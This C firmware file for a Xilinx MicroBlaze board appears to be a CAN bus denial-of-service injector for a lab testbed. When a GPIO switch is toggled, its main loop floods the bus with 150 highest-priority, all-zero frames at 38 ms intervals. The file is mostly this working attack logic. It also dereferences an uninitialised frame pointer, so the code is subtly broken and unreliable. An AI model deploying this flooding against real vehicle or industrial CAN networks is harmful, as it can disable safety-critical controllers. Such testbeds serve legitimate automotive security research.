/*
 *
 * Xilinx, Inc.
 * XILINX IS PROVIDING THIS DESIGN, CODE, OR INFORMATION "AS IS" AS A 
 * COURTESY TO YOU.  BY PROVIDING THIS DESIGN, CODE, OR INFORMATION AS
 * ONE POSSIBLE   IMPLEMENTATION OF THIS FEATURE, APPLICATION OR 
 * STANDARD, XILINX IS MAKING NO REPRESENTATION THAT THIS IMPLEMENTATION 
 * IS FREE FROM ANY CLAIMS OF INFRINGEMENT, AND YOU ARE RESPONSIBLE 
 * FOR OBTAINING ANY RIGHTS YOU MAY REQUIRE FOR YOUR IMPLEMENTATION
 * XILINX EXPRESSLY DISCLAIMS ANY WARRANTY WHATSOEVER WITH RESPECT TO 
 * THE ADEQUACY OF THE IMPLEMENTATION, INCLUDING BUT NOT LIMITED TO 
 * ANY WARRANTIES OR REPRESENTATIONS THAT THIS IMPLEMENTATION IS FREE 
 * FROM CLAIMS OF INFRINGEMENT, IMPLIED WARRANTIES OF MERCHANTABILITY 
 * AND FITNESS FOR A PARTICULAR PURPOSE.
 */

/*
 * 
 *
 * This file is a generated sample test application.
 *
 * This application is intended to test and/or illustrate some 
 * functionality of your system.  The contents of this file may
 * vary depending on the IP in your system and may use existing
 * IP driver functions.  These drivers will be generated in your
 * SDK application project when you run the "Generate Libraries" menu item.
 *
 */

#include <stdio.h>
#include "xparameters.h"
#include "xil_printf.h"
#include "sleep.h"
#include "xil_exception.h"
#include "xdebug.h"

#include "xintc.h"
#include "xil_cache.h"
#include "sleep.h"
#include "can_drv.h"
#include "xgpio.h"


/*
 * AXI DEVICE DEFINE
 * */
// INTC
#define INTC_ID        XPAR_MICROBLAZE_5_AXI_INTC_DEVICE_ID
// CAN Controller
#define CAN_0_BASEADDR XPAR_MB_DOS_CAN_CONTROLLER_S00_AXI_BASEADDR
#define CAN_0_INTR_ID XPAR_INTC_0_CAN_CONTROLLER_0_VEC_ID
// MB0_DOS_RCV
#define DOS_CMD_GPIO_DEVICE_ID XPAR_MB4_DOS_RCV_BASEADDR

/*
 * AXI DECIVE INSTANCE
 * */

static XIntc Intc;
static XGpio GpioInput;

/*
 * Structure
 * */
struct can_data_frame trans_frame;
struct can_data_frame recv_frame;

/**
 * Variables
 * */

volatile uint8_t dos_atk_flag = 0;
volatile uint8_t lst_dos_atk_flag = 0;
volatile uint8_t switch_state = 0;



/*
 * FUNCTION DECLARE
 * */

// IRQ handler

//void can_0_irq_handler(void *InstancePtr);

void intc_init(){
   print("Initialize interrupt controller \r\n");
   XIntc_Initialize(&Intc, INTC_ID);
}

void cache_init(){
	Xil_ICacheEnable();
	Xil_DCacheEnable();
}

void intc_setup(){
   print("Initialize interrupt setup \r\n");
   XIntc_Start(&Intc, XIN_REAL_MODE);	//start INTC controller
   // Interrupt instance begin

   //XIntc_Enable(&Intc,CAN_0_INTR_ID);
   // Interrupt instance end
   Xil_ExceptionInit();
	Xil_ExceptionRegisterHandler(XIL_EXCEPTION_ID_INT,
	(Xil_ExceptionHandler)XIntc_InterruptHandler , &Intc);
	Xil_ExceptionEnable();
}

void can_device_init(){
	can_init(CAN_0_BASEADDR);
	//XIntc_Connect(&Intc, CAN_0_INTR_ID,(XInterruptHandler)can_0_irq_handler, NULL);
}

void gpio_init(){
    XGpio_Initialize(&GpioInput, DOS_CMD_GPIO_DEVICE_ID);
    XGpio_SetDataDirection(&GpioInput, 1, 0xFFFFFFFF);
}

void device_init(){
	print("Initialize Device \r\n");
	intc_init();
	cache_init();
	gpio_init();
	can_device_init();
	intc_setup();
}

int main () 
{
   int dos_loop_times;
   device_init();
       // CAN FRAME INIT
	struct can_data_frame *inject_frame;
	inject_frame->can_addr = CAN_0_BASEADDR;
	inject_frame->data_mode = PELI;
	inject_frame->addr1 = 0x00;
	inject_frame->addr2 = 0x00;
	inject_frame->addr3 = 0x00;
	inject_frame->config_code = CAN_CONFIG;
	// init data
	inject_frame->data0 = 0x00;
	inject_frame->data1 = 0x00;
	inject_frame->data2 = 0x00;
	inject_frame->data3 = 0x00;
	inject_frame->data4 = 0x00;
	inject_frame->data5 = 0x00;
	inject_frame->data6 = 0x00;
	inject_frame->data7 = 0x00;

	  //for(int i = 1; i<20 ; i++){

	  //}
   while(1){
	   switch_state = XGpio_DiscreteRead(&GpioInput, 1);
	   dos_atk_flag = switch_state & 0x01;
	   if((dos_atk_flag != lst_dos_atk_flag) && (dos_atk_flag == true)){
		   for(int i = 0;i < 150; i++){
			      usleep(38000);
				  can_txd_frame(inject_frame);
		   }
	   }
	   lst_dos_atk_flag = dos_atk_flag;
//    	if(dos_atk_flag){
//		microblaze_disable_interrupts();
//
//         dos_loop_times = 10;
//         for(unsigned int i = 0;i < dos_loop_times;i++){
//            can_txd_frame(inject_frame);
//         }
//         dos_atk_flag = 0;
//
// 		microblaze_enable_interrupts();
//    	}


   }

   return 0;
}

//void ecu_process_logic(struct can_data_frame *frame){
//    /* if receive ECU3 Collision Detector*/
//    if((frame->addr1 == MB0_CAN0_ID) && (frame->data1 & 0x80) && (frame->data4 & 0x80)){
//    	dos_atk_flag = 1;
//    }else if((frame->addr1 == MB0_CAN0_ID) && (!(frame->data1 & 0x80))  && (frame->data4 & 0x80)){
//    	dos_atk_flag = 0;
//    }
//
//}

//void can_0_irq_handler(void *InstancePtr){
	//can_rxd_frame(&recv_frame);
    //ecu_process_logic(&recv_frame);
//}
